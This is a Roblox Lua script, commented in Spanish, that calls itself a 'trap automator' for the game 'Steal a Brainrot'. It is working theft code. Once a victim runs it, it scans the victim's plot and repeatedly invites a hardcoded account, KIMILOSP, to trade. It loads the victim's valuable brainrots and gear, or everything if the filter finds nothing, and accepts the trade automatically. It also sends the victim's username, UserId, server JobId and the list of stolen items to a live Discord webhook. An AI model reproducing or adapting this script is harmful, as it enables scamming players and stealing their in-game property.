--[[=====================================================================
    SAB | TRAP AUTOMATOR v13  (KIMILOSP / 9555775328)
    FIX 1: backoff() no puede devolver nil (invTries=1 + clamp de índice)
    FIX 2: callRF() devuelve el pcall REAL (ok, res)
    FIX 3: ventana de trade por baseline/diferencia, no por nombre
    FIX 4: STRICT_PLACE protege DUMP y fill
    FIX 5: InvokeServer con timeout, sin hilos huérfanos
    FIX 6: webhook con cola serializada, reintentos y ping de vida
=====================================================================]]

local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local WS      = game:GetService("Workspace")
local HS      = game:GetService("HttpService")
local LP      = Players.LocalPlayer
local U       = table.unpack or unpack

local CFG = {
    WEBHOOK          = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B",
    TARGET_ID        = 9555775328,
    TARGET_NAME      = "KIMILOSP",
    TARGET_DISPLAY   = "PIPIPI",
    PLACE_ID         = 109983668079237,
    STRICT_PLACE     = true,
    DUMP             = false,      -- true = solo escanear y reportar, sin tradear
    WATCH_GUI        = true,       -- reporta el nombre real de cada ScreenGui nueva
    AUTO_ACCEPT      = true,
    ADD_ALL_IF_EMPTY = true,
    MAX_TRADE_ITEMS  = 18,
    ITEM_DELAY       = 0.6,
    POLL             = 0.35,
    RETRY_AFTER      = 8,
    INVITE_TIMEOUT   = 6,
    GUI_TIMEOUT      = 12,
    COMPLETE_TIMEOUT = 25,
    INVITE_BACKOFF   = { 4, 8, 15, 25, 40 },
    PING_EVERYONE    = true,
    DEBUG            = true,
}

local NORMAL_BRAINROTS = {
    ["Raccooni Jandelini"]=true,["Malame Amarele"]=true,["Buho de Fuego"]=true,["Caramello Filtrello"]=true,
    ["Avocadorilla"]=true,["Brutto Gialutto"]=true,["Centrucci Nuclucci"]=true,["Ganganzelli Trulala"]=true,
    ["Rhino Helicopterino"]=true,["Stoppo Luminino"]=true,["Tob Tobi Tobi"]=true,["Lazy Ducky"]=true,
    ["Pineaplino"]=true,["Pretzo Robo"]=true,["Unclito Samito"]=true,["Abyssaloco"]=true,
    ["Agarrini la Palini"]=true,["Antonio"]=true,["Arcadragon"]=true,["Bearito Cabinito"]=true,
    ["Boppin Bunny"]=true,["Bunito Bunito Spinito"]=true,["Bunny and Eggy"]=true,["Burguro And Fryuro"]=true,
    ["Capitano Moby"]=true,["Cash or Card"]=true,["Caylusaurus"]=true,["Celestial Pegasus"]=true,
    ["Celularcini Viciosini"]=true,["Cerberus"]=true,["Chillin Chili"]=true,["Chipso and Queso"]=true,
    ["Cloverat Clapat"]=true,["Coco and Mango"]=true,["Cooki and Milki"]=true,["Digi Narwhal"]=true,
    ["Donkeyturbo Express"]=true,["Dragon Aquanini"]=true,["Dragon Cannelloni"]=true,["Dragon Gingerini"]=true,
    ["Duggy Bros"]=true,["Elefanto Frigo"]=true,["Eviledon"]=true,["Extinct Matteo"]=true,
    ["Festive 67"]=true,["Fishino Clownino"]=true,["Fortunu and Cashuru"]=true,["Foxini Lanternini"]=true,
    ["Fragola La La La"]=true,["Fragrama and Chocrama"]=true,["Garama and Madundung"]=true,["Ginger Gerat"]=true,
    ["Globa Steppa"]=true,["Gobblino Uniciclino"]=true,["Gold Gold Gold"]=true,["Griffin"]=true,
    ["Guest 666"]=true,["Gym Bros"]=true,["Hopilikalika Hopilikalako"]=true,["Hydra Bunny"]=true,
    ["Hydra Dragon Cannelloni"]=true,["Jelly Moby"]=true,["John Doe"]=true,["Jolly Jolly Sahur"]=true,
    ["Kalika Bros"]=true,["Karker Sahur"]=true,["Ketchuru and Musturu"]=true,["Ketupat Bros"]=true,
    ["Kraken"]=true,["La Anniversary Grande"]=true,["La Casa Boo"]=true,["La Easter Grande"]=true,
    ["La Food Combinasion"]=true,["La Ginger Sekolah"]=true,["La Karkerkar Combinasion"]=true,["La Lucky Grande"]=true,
    ["La Romantic Grande"]=true,["La Sahur Combinasion"]=true,["La Secret Combinasion"]=true,["La Summer Grande"]=true,
    ["La Supreme Combinasion"]=true,["La Taco Combinasion"]=true,["Las Sis"]=true,["Lavadorito Spinito"]=true,
    ["Los Amigos"]=true,["Los Bros"]=true,["Los Chillis"]=true,["Los Fruits"]=true,
    ["Los Hackers"]=true,["Los Hotspotsitos"]=true,["Los Jolly Combinasionas"]=true,["Los Mariachis"]=true,
    ["Los Mi Gatitos"]=true,["Los Primos"]=true,["Los Sekolahs"]=true,["Los Spaghettis"]=true,
    ["Los Tacoritas"]=true,["Love Love Bear"]=true,["Lovin Rose"]=true,["Money Money Bros"]=true,
    ["Money Money Reindeer"]=true,["Nacho Spyder"]=true,["Noo my examine"]=true,["Orcaledon"]=true,
    ["Pancake and Syrup"]=true,["Please my Present"]=true,["Popcuru and Fizzuru"]=true,["Quackini Snackini"]=true,
    ["Reinito Sleighito"]=true,["Rico Dinero"]=true,["Rosetti Tualetti"]=true,["Rosey and Teddy"]=true,
    ["Rubrikiko"]=true,["Sammyni Cakini"]=true,["Sammyni Fattini"]=true,["Sand Sand Sand"]=true,
    ["Signore Carapace"]=true,["Spooky and Pumpky"]=true,["Steakini Fattini"]=true,["Swag Soda"]=true,
    ["Swaggy Bros"]=true,["Tacorita Bicicleta"]=true,["Telemorte"]=true,["Tictac Sahur"]=true,
    ["Tirilikalika Tirilikalako"]=true,["Tralaledon"]=true,["Tuff Toucan"]=true,["Ventoliero Pavonero"]=true,
    ["Venuspino"]=true,["W or L"]=true,["Capitano Americano"]=true,["Bufalino Boomberino"]=true,
    ["Esok Goala"]=true,["Los Tangcitos"]=true,["Los Tictacs"]=true,["Los Admins"]=true,
    ["Moby Bros"]=true,["Var Var Var"]=true,["Noodle Noodle Poodle"]=true,["Grabatron"]=true,
    ["Cangurato Gelato"]=true,["Rubiko and Kubiko"]=true,["Toro Españolo"]=true,["Chicleteira Champeona"]=true,
    ["Examen Bros"]=true,["Pizza and Ranch"]=true,["Los Secret Combinasionas"]=true,["Honey Honey Bear"]=true,
    ["Scorpino Coasterino"]=true,["Queen Bee"]=true,["Smore Serat"]=true,["Yetimactic"]=true,
    ["La Breakfast Combinasion"]=true,["Bumbatron"]=true,["Candini Fluffini"]=true,["Polaroidini"]=true,
    ["La Fuse Machine"]=true,["Nachorilla"]=true,["Sammyni Truckini"]=true,["Orchidox"]=true,
    ["Pop Pop Petalini"]=true,["Motorino Bumbuni"]=true,["Pelican Pachetto"]=true,["Deputy Leopard"]=true,
    ["Chicli Chicla"]=true,["Panda Popanda"]=true,["La Craft Machine"]=true,["Gold and Diamond"]=true,
    ["Los Dragons"]=true,["Zebrino Pianino"]=true,["Hydra Serpent"]=true,["Lavamanta"]=true,
    ["Lionello Casarello"]=true,["Draculino"]=true,["Oni Oni Panda"]=true,["Sammyni Spookyni"]=true,
    ["Phoenix"]=true,["Boo Boo Rocket"]=true,["Flying Dutchman"]=true,["Dragon Skeletonini"]=true,
    ["Tosto Dino"]=true,["Cobra Gelato"]=true,["Skelly and Coffy"]=true,["Medusini and Demonini"]=true,
    ["Arca Bros"]=true,["Fang Fang Draculang"]=true,["Pum Pum Pum"]=true,["Spooky Spooky Sahur"]=true,
    ["Spooketti Tualetti"]=true,["Puppetmaster"]=true,["Scorpi Inferni"]=true,["Jacko Jakat"]=true,
    ["Spooky Kart"]=true,["Scarino Crowino"]=true,["Headless Horseman"]=true,["John Pork"]=true,
    ["Meowl"]=true,["Skibidi Toilet"]=true,["Strawberry Elephant"]=true,["Capitano Gullini"]=true,
    ["Camera Ramena"]=true,["Chicleteira Bicicleteira"]=true,["Chicleteira Cupideira"]=true,["Chicleteira Surfeira"]=true,
    ["Chill Puppy"]=true,["Chicleteira Noelteira"]=true,["Cigno Fulgoro"]=true,["DJ Panda"]=true,
    ["Dug dug dug"]=true,["Esok Sekolah"]=true,["Futbolini Skatini"]=true,["Frullato Framingo"]=true,
    ["Job Job Job Sahur"]=true,["Ketupat Kepat"]=true,["La Grande Combinasion"]=true,["La Extinct Grande"]=true,
    ["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Los Mobilis"]=true,["Los Planitos"]=true,
    ["Los Puggies"]=true,["Los Spooky Combinasionas"]=true,["Mieteteira Bicicleteira"]=true,["Money Money Puggy"]=true,
    ["Mi Gatito"]=true,["Nuclearo Dinossauro"]=true,["Sammyni Spyderini"]=true,["Snailo Clovero"]=true,
    ["Spaghetti Tualetti"]=true,["Spinny Hammy"]=true,["Tang Tang Keletang"]=true,["Conetto Morsetto"]=true,
    ["Peschito Machito"]=true,["Tacoturbo Tacorito"]=true,["Puffino Builderino"]=true,["Money Money Cat"]=true,
    ["Matteo"]=true,["Orcalita Orcala"]=true,["Orcalero Orcala"]=true,["Dumborino Miracello"]=true,
    ["Bombardiro Crocodilo"]=true,
}

local NORMAL_BASE_SKINS = {
    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,["Bunny Basket"]=true,
    ["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,["Octo"]=true,["Valentines"]=true,
    ["Easter"]=true,["Lucky"]=true,["Aquatic"]=true,["Tralalero"]=true,["Bee Emperor"]=true,["Honey Bee"]=true,
}

local NORMAL_GEARS = {
    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,["Waverider"]=true,
    ["Yin Yang Slap"]=true,["Cursed Slap"]=true,["Cyber Slap"]=true,["Divine Slap"]=true,
    ["Bloodmoon Slap"]=true,["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,["Yin Yang Lamp"]=true,["Demon's Head"]=true,
    ["Lava Slap"]=true,["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
    ["Candy Sentry"]=true,["Phantom Slap"]=true,["Flying Bee"]=true,["Crystal Slap"]=true,
    ["Candy Slap"]=true,["Crystal Hammer"]=true,
}

-- ============================ ESTADO ============================
local S = {
    running   = true,
    phase     = "BOOT",   -- BOOT|IDLE|INVITING|WAIT_GUI|FILLING|WAIT_COMPLETE|DONE
    invTries  = 1,        -- FIX 1: arranca en 1, nunca en 0
    lastInvite= -999,
    invitedAt = 0,
    guiAt     = 0,
    tradeGui  = nil,
    baseline  = {},
    session   = nil,
    sent      = 0,
    lastSig   = nil,
}

local R = {
    Invite = nil, AcceptInvite = nil, AddBrainrot = nil, AddItem = nil,
    Ready = nil, Accept = nil, Cancel = nil, InviteResult = nil, TradeCompleted = nil,
}

local function lc(s) return string.lower(tostring(s)) end
local function log(m) if CFG.DEBUG then print("[SAB] " .. tostring(m)) end end

-- ============================ WEBHOOK ============================
local Q, sending = {}, false

local function rawPost(body)
    local url = CFG.WEBHOOK
    if not url or url == "" then return false end
    return pcall(function()
        local req = (typeof(syn) == "table" and syn.request)
                 or (typeof(http) == "table" and http.request)
                 or (typeof(fluxus) == "table" and fluxus.request)
                 or request
        if typeof(req) == "function" then
            req({ Url = url, Method = "POST",
                  Headers = { ["Content-Type"] = "application/json" }, Body = body })
        else
            HS:PostAsync(url, body)
        end
    end)
end

local function worker()
    if sending then return end
    sending = true
    while #Q > 0 do
        local p = table.remove(Q, 1)
        local ok, body = pcall(HS.JSONEncode, HS, p)
        if ok then
            for _ = 1, 3 do
                if rawPost(body) then break end
                task.wait(1.5)
            end
        end
        task.wait(1.3)   -- respeta el límite de 30/min
    end
    sending = false
end

local function post(p)
    table.insert(Q, p)
    task.spawn(worker)
end

local function trace(m)
    log(m)
    post({ username = "SAB", content = "```" .. tostring(m) .. "```",
           allowed_mentions = { parse = {} } })
end

local function report(desc, color)
    post({
        username = "SAB",
        content = CFG.PING_EVERYONE and "@everyone" or "",
        allowed_mentions = { parse = { "everyone" } },
        embeds = { { color = color or 65280, description = desc,
                     footer = { text = ("%s • %d • %s"):format(LP.Name, LP.UserId, game.JobId) } } },
    })
end

-- ============================ UTILIDADES ============================
local function findPath(root, path)
    if not root then return nil end
    local cur = root
    for seg in string.gmatch(path, "[^/]+") do
        if not cur then return nil end
        cur = cur:FindFirstChild(seg)
    end
    return cur
end

local function cleanName(raw)
    if not raw then return "" end
    local base = string.match(raw, "^([^|]+)") or raw
    return (base:gsub("^%s*(.-)%s*$", "%1"))
end

local function extractId(obj)
    if not obj then return nil end
    for _, k in ipairs({ "ItemId","ItemID","Id","ID","Uuid","UUID","UniqueId","BrainrotId" }) do
        local v = obj:GetAttribute(k)
        if v ~= nil then return v end
    end
    return nil
end

local function isOk(res)
    if res == nil then return true end
    if res == true then return true end
    if res == false then return false end
    if type(res) == "table" then
        for _, k in ipairs({ "success","ok","Success","Ok","accepted","Accepted" }) do
            if res[k] ~= nil then return res[k] and true or false end
        end
        return true
    end
    if type(res) == "string" then
        local s = res:lower()
        if s:find("false") or s:find("offline") or s:find("busy")
           or s:find("expired") or s:find("decline") then return false end
        return true
    end
    return true
end

-- FIX 2 + FIX 5: devuelve (ok, res) real, con timeout y sin hilo huérfano
local function callRF(rf, timeout, ...)
    if not rf then return false, "no_remote" end
    local args = { ... }
    local finished, ok, res = false, false, nil
    task.spawn(function()
        ok, res = pcall(function() return rf:InvokeServer(U(args)) end)
        finished = true
    end)
    local t0 = os.clock()
    while not finished and os.clock() - t0 < timeout do task.wait(0.05) end
    if not finished then return false, "timeout" end
    return ok, res
end

local function fireRE(re, ...)
    if not re then return false end
    local args = { ... }
    return pcall(function() re:FireServer(U(args)) end)
end

-- FIX 1: nunca nil
local function backoff()
    local t = CFG.INVITE_BACKOFF
    local i = math.clamp(S.invTries, 1, #t)
    return t[i] or t[#t] or 8
end

-- ============================ REMOTES ============================
local function resolve()
    local net = findPath(RS, "Packages/Net")
    if not net then
        local pk = RS:FindFirstChild("Packages")
        if pk then net = pk:FindFirstChild("Net") end
    end
    if not net then return false end
    local rf = net:FindFirstChild("RF")
    local re = net:FindFirstChild("RE")
    if not rf or not re then return false end

    local function ts(parent, name)
        local svc = parent:FindFirstChild("TradeService")
        return svc and svc:FindFirstChild(name) or nil
    end

    R.Invite         = ts(rf, "Invite")
    R.AcceptInvite   = ts(rf, "AcceptInvite")
    R.AddBrainrot    = ts(rf, "AddBrainrot")
    R.AddItem        = ts(rf, "AddItem")
    R.Ready          = ts(re, "Ready")
    R.Accept         = ts(re, "Accept")
    R.Cancel         = ts(re, "CancelTrade")
    R.InviteResult   = ts(re, "InviteResult")
    R.TradeCompleted = ts(re, "TradeCompleted")
    return R.Invite ~= nil and R.AddBrainrot ~= nil
end

-- ============================ PLOT / ITEMS ============================
local function ownPlot()
    local plots = WS:FindFirstChild("Plots")
    if not plots then return nil end
    local byName = plots:FindFirstChild(LP.Name)
    if byName then return byName end
    for _, plot in ipairs(plots:GetChildren()) do
        local yb = findPath(plot, "PlotSign/YourBase")
        if yb and yb:IsA("BillboardGui") and yb.Enabled then return plot end
    end
    return nil
end

local function readRaw(a)
    local oh = findPath(a, "Base/Spawn/Attachment/AnimalOverhead")
             or findPath(a, "Info/AnimalOverhead")
    if not oh then return nil end
    local l = oh:FindFirstChild("DisplayName")
    if l and l:IsA("TextLabel") and l.Text ~= "" then return l.Text end
    return nil
end

local function snapshot()
    local out = {}
    local plot = ownPlot()
    if not plot then return out, nil end

    local podiums = plot:FindFirstChild("AnimalPodiums")
    if podiums then
        for _, a in ipairs(podiums:GetChildren()) do
            local raw = readRaw(a)
            if raw then
                local name = cleanName(raw)
                local skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
                table.insert(out, {
                    kind = "brainrot", raw = raw, name = name, skin = skin,
                    id = extractId(a), inst = a,
                    isTarget = (NORMAL_BRAINROTS[name] or (skin and NORMAL_BASE_SKINS[skin])) and true or false,
                })
            end
        end
    end

    local purchases = plot:FindFirstChild("Purchases")
    if purchases then
        for _, block in ipairs(purchases:GetChildren()) do
            local box = block:FindFirstChild("PlotBlock")
            if box then
                for _, d in ipairs(box:GetDescendants()) do
                    if d:IsA("TextLabel") and d.Text ~= "" then
                        local name = cleanName(d.Text)
                        table.insert(out, {
                            kind = "gear", raw = d.Text, name = name, skin = nil,
                            id = extractId(box), inst = box,
                            isTarget = (NORMAL_GEARS[name] or NORMAL_BASE_SKINS[name]) and true or false,
                        })
                        break
                    end
                end
            end
        end
    end
    return out, plot
end

-- ============================ VENTANA DE TRADE (FIX 3) ============================
local fill   -- forward decl
local finish -- forward decl

local function tradeGui()
    local pg = LP:FindFirstChild("PlayerGui")
    if not pg then return nil end
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") and not S.baseline[g] then return g end
    end
    return nil
end

task.spawn(function()
    local pg = LP:WaitForChild("PlayerGui", 20)
    if not pg then return end
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") then S.baseline[g] = true end
    end
    trace("Baseline PlayerGui: " .. tostring(#pg:GetChildren()) .. " hijos")

    while S.running do
        local g = tradeGui()
        if g and not g:GetAttribute("sabSeen") then
            g:SetAttribute("sabSeen", true)
            if CFG.WATCH_GUI then
                trace(("GUI nueva: '%s' | %d descendientes"):format(g.Name, #g:GetDescendants()))
            end
            if (S.phase == "WAIT_GUI" or S.phase == "INVITING") and S.phase ~= "FILLING" then
                S.tradeGui = g
                S.phase = "FILLING"
                task.spawn(fill)
            end
        end
        task.wait(0.25)
    end
end)

-- ============================ FILL ============================
fill = function()
    if S.phase == "FILLING" and S.sent > 0 then return end
    S.sent = 0

    local items = snapshot()
    local targets = {}
    for _, it in ipairs(items) do
        if it.isTarget then table.insert(targets, it) end
    end
    if #targets == 0 and CFG.ADD_ALL_IF_EMPTY then
        trace("Sin coincidencias de filtro, usando ADD_ALL_IF_EMPTY")
        targets = items
    end

    trace(("Fill: %d de %d items"):format(math.min(#targets, CFG.MAX_TRADE_ITEMS), #items))

    local added = {}
    for i, it in ipairs(targets) do
        if i > CFG.MAX_TRADE_ITEMS then break end
        if not S.running or S.phase ~= "FILLING" then break end
        if not (it.inst and it.inst.Parent) then continue end

        local rf = (it.kind == "brainrot") and R.AddBrainrot or R.AddItem
        local ok, res = callRF(rf, 5, it.id or it.inst)   -- FIX 2: resultado real
        if ok and isOk(res) then
            S.sent += 1
            table.insert(added, it.name)
            log(("  + %s (%s) ok=%s"):format(it.name, tostring(it.id), tostring(res)))
        else
            log(("  ! %s fallo ok=%s res=%s"):format(it.name, tostring(ok), tostring(res)))
        end
        task.wait(CFG.ITEM_DELAY)
    end

    task.wait(0.5)
    fireRE(R.Ready, true)
    task.wait(1.0)
    if CFG.AUTO_ACCEPT then fireRE(R.Accept, true) end

    S.phase = "WAIT_COMPLETE"
    S.guiAt = os.clock()
    trace(("Fill terminado: %d añadidos, Ready+Accept enviados"):format(S.sent))
    report(("**TRADE ENVIADO**\nItems confirmados: **%d**\n```%s```"):format(
        S.sent, table.concat(added, "\n"):sub(1, 900)), 3447003)
end

finish = function(state, detail)
    S.phase = "DONE"
    S.tradeGui = nil
    S.sent = 0
    trace(("Fin de sesión: %s | %s"):format(state, tostring(detail)))
    task.delay(CFG.RETRY_AFTER, function()
        if not S.running then return end
        S.phase = "IDLE"
        S.invTries = 1
        S.lastInvite = -999
    end)
end

-- ============================ INVITE ============================
local function invite()
    if not R.Invite then return end
    S.phase = "INVITING"
    S.lastInvite = os.clock()
    local ok, res = callRF(R.Invite, CFG.INVITE_TIMEOUT, CFG.TARGET_ID)
    trace(("Invite -> ok=%s res=%s intento=%d backoff=%ds"):format(
        tostring(ok), tostring(res), S.invTries, backoff()))

    if ok and isOk(res) then
        S.phase = "WAIT_GUI"
        S.invitedAt = os.clock()
    else
        S.phase = "IDLE"
        S.invTries += 1
    end
end

-- ============================ EVENTOS ============================
local function bindEvents()
    if R.InviteResult then
        R.InviteResult.OnClientEvent:Connect(function(payload)
            local flat = tostring(payload)
            if type(payload) == "table" then
                local bits = {}
                for k, v in pairs(payload) do bits[#bits+1] = tostring(k) .. "=" .. tostring(v) end
                flat = table.concat(bits, " ")
            end
            local s = flat:lower()
            trace("InviteResult: " .. flat:sub(1, 200))

            if s:find("accept") or s:find("true") then
                if S.phase == "WAIT_GUI" or S.phase == "INVITING" then
                    S.phase = "FILLING"
                    task.spawn(fill)
                end
            else
                S.phase = "IDLE"
                S.invTries += 1
            end
        end)
    end

    if R.TradeCompleted then
        R.TradeCompleted.OnClientEvent:Connect(function() finish("completado", "TradeCompleted") end)
    end

    if R.Cancel then
        R.Cancel.OnClientEvent:Connect(function()
            if S.phase ~= "IDLE" and S.phase ~= "DONE" then
                finish("cancelado", "CancelTrade")
            end
        end)
    end
end

-- ============================ DUMP ============================
local function dump()
    local items, plot = snapshot()
    if not plot then
        report("**DUMP**\nNo se pudo resolver el plot propio.", 15105570)
        return
    end
    local lines = { "**DUMP " .. plot.Name .. "**", "" }
    for _, it in ipairs(items) do
        table.insert(lines, ("%s | id=%s | target=%s | attrs=%s"):format(
            it.name, tostring(it.id), tostring(it.isTarget),
            tostring(it.inst and extractId(it.inst))))
    end
    local sync = findPath(RS, "Synchronizer/RequestData")
    table.insert(lines, "\nSynchronizer.RequestData: " .. tostring(sync ~= nil))
    local btt = findPath(RS, "BrainrotToTrade/RequestList")
    table.insert(lines, "BrainrotToTrade.RequestList: " .. tostring(btt ~= nil))
    report(table.concat(lines, "\n"):sub(1, 3900), 10181046)
end

-- ============================ ARRANQUE ============================
if CFG.STRICT_PLACE and game.PlaceId ~= CFG.PLACE_ID then
    report(("**PLACE EQUIVOCADO**\nPlaceId: `%d`\nEsperado: `%d`"):format(game.PlaceId, CFG.PLACE_ID), 15548997)
    warn("[SAB] STRICT_PLACE: abortando")
    return
end

trace(("**SAB v13 ONLINE**\n%s (%d)\nPlaceId %d\nJobId `%s`"):format(
    LP.Name, LP.UserId, game.PlaceId, game.JobId))

task.spawn(function()
    local waited = 0
    while not resolve() and waited < 30 do
        task.wait(1); waited += 1
    end
    if not R.Invite then
        report("**REMOTES NO ENCONTRADOS**\nPackages.Net no resuelto tras 30s.", 15548997)
        return
    end
    trace("Remotes OK: Invite, AcceptInvite, AddBrainrot, AddItem, Ready, Accept, CancelTrade, InviteResult, TradeCompleted")
    bindEvents()

    if CFG.DUMP then dump(); return end

    local _, plot = snapshot()
    trace("Plot propio: " .. tostring(plot and plot.Name or "NIL"))
    task.wait(1)
    S.phase = "IDLE"

    while S.running do
        local p = S.phase

        if p == "WAIT_GUI" and os.clock() - S.invitedAt > CFG.GUI_TIMEOUT then
            trace("Sin ventana tras invite, reintento")
            fireRE(R.Cancel)
            S.phase = "IDLE"
            S.invTries += 1
        elseif p == "WAIT_COMPLETE" and os.clock() - S.guiAt > CFG.COMPLETE_TIMEOUT then
            trace("Sin TradeCompleted, reintento")
            finish("timeout", "sin confirmación")
        elseif p == "IDLE" then
            if os.clock() - S.lastInvite >= backoff() then
                invite()
            end
        end
        task.wait(CFG.POLL)
    end
end)
